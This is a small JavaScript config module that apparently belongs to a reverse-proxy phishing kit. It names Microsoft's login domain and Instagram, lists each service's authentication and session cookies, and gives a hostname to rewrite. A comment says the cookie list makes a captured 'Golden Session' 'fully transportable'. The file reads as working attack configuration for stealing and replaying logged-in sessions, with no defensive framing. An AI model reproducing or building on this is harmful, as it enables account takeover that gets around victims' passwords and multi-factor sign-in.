module.exports = {
  ms: {
    name: "Microsoft",
    url: "https://login.microsoftonline.com",
    cookieNames: [
      "ESTSAUTH",
      "ESTSAUTHPERSIST",
      "esctx",
      "fpc",
      "stsservicecookie",
      "MSCPPOK",
      "ESTSSC"
    ],
    rewriteString: "login.microsoftonline.com",
  },
  ig: {
    name: "Instagram",
    url: "https://www.instagram.com",
    // This exact list ensures the 'Golden Session' is fully transportable
    cookieNames: [
      "csrftoken",
      "datr",
      "ig_did",
      "mid",
      "ps_l",
      "ps_n",
      "wd",
      "sessionid",
      "rur",
      "ds_user_id"
    ],
    rewriteString: "www.instagram.com",
  },
};
